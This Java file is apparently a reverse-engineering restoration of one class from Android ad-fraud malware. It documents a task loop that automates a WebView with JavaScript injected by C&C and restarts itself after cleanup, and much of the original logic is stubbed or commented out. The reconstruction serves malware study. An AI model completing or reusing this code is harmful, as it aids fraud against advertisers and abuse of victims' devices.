package touch;

import android.graphics.Bitmap;
import android.os.SystemClock;
import android.util.Log;
import android.webkit.WebView;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: lIllIlIll1.llllIllIl1
 *
 * Non-signaling (autonomous ad-fraud) mode task implementation.
 * Extends WebViewAutomationBase to run ad-fraud automation without WebRTC remote control.
 *
 * Key behaviors:
 * - Uses a local Screenshotter (BitmapScreenshotter) for screenshot capture
 * - Always reports main page as loaded (no landing page gate)
 * - Never reports signaling as active
 * - After cleanup, triggers a restart callback to start the next task cycle,
 *   enabling continuous autonomous ad-fraud operation
 *
 * Original obfuscated name: lIllIlIll1.llllIllIl1
 */
public class NonSignalingModeTask extends WebViewAutomationBase {

    private static final String TAG = "NonSignalingModeTask";

    /**
     * Callback invoked after cleanup to restart the task cycle.
     * This enables the chain execution pattern: task completes → cleanup → restart → new task.
     */
    public final Runnable restartCallback;

    /**
     * Screen capture helper for taking screenshots of the WebView content.
     * Original type: IIIlIllIlI1.IllIIlIIII1 (Screenshotter)
     */
    public Object /* Screenshotter */ screenshotter;

    /**
     * No-op screenshot callback that discards captured bitmaps.
     * Used as a placeholder when the screenshotter requires a callback but
     * no action is needed on individual captures.
     *
     * Original obfuscated name: llllIIIIll1
     */
    public class EmptyScreenshotCallback /* implements ScreenshotCallback */ {
        public EmptyScreenshotCallback() {
        }

        public void onScreenshot(Bitmap bitmap) {
            // Intentionally empty - screenshots are retrieved on demand via captureScreenshot()
        }
    }

    /**
     * Constructs a NonSignalingModeTask.
     *
     * @param webView         the WebView to automate
     * @param configJson      task configuration JSON from C&C
     * @param jsScript        the JavaScript code to inject into pages
     * @param restartCallback callback to invoke after cleanup to start the next task cycle
     */
    public NonSignalingModeTask(WebView webView, JSONObject configJson, String jsScript,
                                 Runnable restartCallback) throws JSONException {
        super(webView, configJson, jsScript);
        this.restartCallback = restartCallback;
    }

    /**
     * Always returns true — in non-signaling mode, the page is always considered "loaded"
     * since there is no landing page gate (unlike signaling mode which waits for IN_LANDING).
     */
    @Override
    public boolean isMainPageLoaded() {
        return true;
    }

    /**
     * Performs cleanup: stops the screenshotter, waits 1 second, then triggers the
     * restart callback to begin the next task cycle.
     *
     * The 1-second delay ensures the WebView is fully destroyed before creating a new one.
     */
    @Override
    public void cleanup() {
        super.cleanup();
        try {
            // Stop the screenshotter
            // Original: this.screenshotter.lIIIIlllllIlll1();
            // screenshotter.stop();
        } catch (Exception e) {
            Log.e(TAG, "destroy error2: " + e);
        }
        // Wait 1 second before restarting to allow WebView destruction to complete
        SystemClock.sleep(1000L);
        // Trigger the restart callback to begin the next task cycle
        this.restartCallback.run();
    }

    /**
     * Always returns false — non-signaling mode does not use WebRTC signaling.
     */
    @Override
    public boolean isSignalingActive() {
        return false;
    }

    /**
     * Called when the WebView is ready. Creates a Screenshotter instance
     * and starts it with the application context and the WebView.
     * Schedules a 500ms delay before task execution begins.
     */
    @Override
    public void onWebViewReady() {
        // Original: new IIIlIllIlI1.IllIIlIIII1(displayMetrics, 1.0f, new EmptyScreenshotCallback())
        // Screenshotter screenshotter = new Screenshotter(
        //     AppContext.getDisplayMetrics(), 1.0f, new EmptyScreenshotCallback());
        // this.screenshotter = screenshotter;
        // screenshotter.start(AppContext.taskConfig.getContext(), this.webView);
        // PreferencesHelper.scheduleDelay(500L);
    }

    /**
     * No-op — signaling status updates are irrelevant in non-signaling mode.
     */
    @Override
    public void updateSignalStatus(int statusCode) {
        // Intentionally empty
    }

    /**
     * Captures a screenshot of the WebView content using the Screenshotter.
     *
     * @param webView the WebView to capture
     * @return the captured Bitmap, or null if the screenshotter is not initialized
     */
    @Override
    public Bitmap captureScreenshot(WebView webView) {
        // Original: return this.screenshotter.llllIIIIll1();
        // return this.screenshotter.captureNow();
        return null; // Placeholder - original delegates to screenshotter.captureNow()
    }
}
